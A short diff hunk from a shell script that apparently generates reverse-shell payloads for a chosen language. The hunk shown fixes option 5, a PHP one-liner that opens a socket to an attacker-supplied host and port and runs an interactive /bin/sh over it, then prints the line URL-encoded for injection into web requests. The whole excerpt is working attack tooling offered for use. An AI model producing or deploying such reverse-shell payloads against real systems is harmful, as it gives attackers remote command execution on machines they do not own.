@@ -107,7 +107,7 @@ case $langu in
 
 
 	5)
-	 message="php -r '$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	 message="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
